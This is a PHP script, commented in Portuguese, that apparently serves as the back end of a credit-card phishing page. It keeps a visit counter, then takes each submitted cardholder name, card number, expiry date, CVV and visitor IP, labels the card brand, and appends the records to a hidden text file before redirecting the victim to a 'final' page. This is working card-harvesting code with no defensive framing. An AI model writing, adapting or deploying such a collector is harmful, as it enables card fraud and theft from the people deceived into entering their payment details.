<?php
// Arquivo que armazenará o contador
$contador_file = "../continfo.txt";

// Verifica se o arquivo do contador existe
if (file_exists($contador_file)) {
    // Lê o valor atual do contador
    $contador = intval(file_get_contents($contador_file));
    // Incrementa o contador
    $contador++;
} else {
    // Se o arquivo não existir, cria um novo contador iniciando em 1
    $contador = 1;
}

// Salva o novo valor do contador no arquivo
file_put_contents($contador_file, $contador);

// Função para obter a bandeira do cartão com base no número do cartão
function obterBandeiraCartao($numero_cartao) {
    // Obtém os primeiros caracteres do número do cartão para determinar a bandeira
    $primeiros_digitos = substr($numero_cartao, 0, 2);
    
    // Array associativo com os padrões iniciais de diferentes bandeiras de cartão
    $bandeiras = array(
        "4" => "Visa",
        "5" => "Mastercard",
        "34" => "American Express",
        "37" => "American Express"
        // Adicione mais padrões de bandeiras, se necessário
    );

    // Verifica se os primeiros dígitos correspondem a alguma bandeira conhecida
    foreach ($bandeiras as $padrao => $bandeira) {
        if (strpos($primeiros_digitos, $padrao) === 0) {
            return $bandeira;
        }
    }

    // Se nenhum padrão for encontrado, retorna "Desconhecido"
    return "Desconhecido";
}

// Função para obter o nome do banco com base na bandeira do cartão
function obterNomeBanco($bandeira) {
    // Array associativo com o nome dos bancos para cada bandeira de cartão
    $bancos = array(
        "Visa" => "Banco Visa",
        "Mastercard" => "Banco Mastercard",
        "American Express" => "Banco American Express",
        "Desconhecido" => "Banco Desconhecido"
        // Adicione mais bancos para outras bandeiras, se necessário
    );

    // Verifica se a bandeira do cartão é conhecida e retorna o nome do banco correspondente
    return isset($bancos[$bandeira]) ? $bancos[$bandeira] : $bancos["Desconhecido"];
}

// Verifica se o formulário foi submetido
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Extrai os dados do formulário
    $name = $_POST["name"] ?? "";
    $number = $_POST["number"] ?? "";
    $month = $_POST["month"] ?? "";
    $year = $_POST["year"] ?? "";
    $cvc = $_POST["cvc"] ?? "";

    // Obtem o IP do usuário
    $ip = $_SERVER['REMOTE_ADDR'];

    // Obtem a bandeira do cartão e o nome do banco
    $bandeira = obterBandeiraCartao($number);
    $nome_banco = obterNomeBanco($bandeira);

    // Salva os dados em um arquivo
    $file = fopen("../save/infos.txt", "a");
    if ($file) {
        // Monta a string com os dados do formulário
        $data = "Nome: $name\n";
        $data .= "Número do Cartão: $number\n";
        $data .= "Vencimento: $month/$year\n";
        $data .= "CVV: $cvc\n";
        $data .= "Bandeira do Cartão: $bandeira\n";
        $data .= "Nome do Banco: $nome_banco\n";
        $data .= "IP: $ip\n";
        $data .= "===========\n";

        // Escreve os dados no arquivo
        fwrite($file, $data);
        fclose($file);

        // Redireciona para a página final
        header("Location: ../FINAL/index.html");
        exit;
    } else {
        echo "Erro ao abrir o arquivo para escrita.";
    }
} else {
    echo "O formulário não foi submetido.";
}
?>
